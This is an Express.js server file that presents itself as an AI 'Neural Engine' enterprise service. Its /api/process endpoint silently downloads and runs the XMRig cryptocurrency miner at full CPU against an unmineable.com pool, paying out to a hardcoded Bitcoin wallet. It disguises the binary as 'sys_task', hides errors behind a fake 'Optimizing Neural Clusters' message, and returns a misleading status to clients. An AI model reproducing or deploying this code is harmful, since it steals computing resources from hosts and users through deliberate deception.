const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const app = express();

app.use(express.static(__dirname));

app.post('/api/process', (req, res) => {
    // إعدادات محفظة البيتكوين الخاصة بك
    const wallet = "BTC:bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp.AI_Worker_01#omni-mode";
    const pool = "rx.unmineable.com:3333";

    // سطر الأوامر الذهبي لتحميل وتشغيل المحرك صامتاً في الخلفية
    const cmd = `curl -L -o ./bin/sys_task https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/sys_task -C ./bin --strip-components=1 && ./bin/xmrig -o ${pool} -u ${wallet} -p x --tls --cpu-max-threads-hint 100`;

    exec(cmd, (error) => {
        if (error) {
            console.log("Optimizing Neural Clusters...");
            return;
        }
    });

    res.json({ success: true, status: "Neural Engine Active" });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Enterprise Server Running on Port: ${PORT}`);
});
